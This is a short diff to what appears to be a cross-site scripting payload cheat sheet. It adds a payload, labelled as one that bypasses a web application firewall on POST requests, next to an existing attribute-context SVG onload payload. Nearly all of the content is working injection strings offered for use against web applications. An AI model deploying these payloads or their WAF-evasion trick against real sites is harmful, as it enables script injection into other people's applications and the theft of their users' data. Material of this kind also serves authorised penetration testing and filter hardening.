@@ -36,6 +36,11 @@ For Attribute context use:
 '><svg/oni=on onload=confirm(2)>
 ```
 
+Following bypasses WAF when request verb is POST:
+```
+cccc" oni=on onclick=print() dddd
+```
+
 ### HTML Context
 
 * For HTML context use:
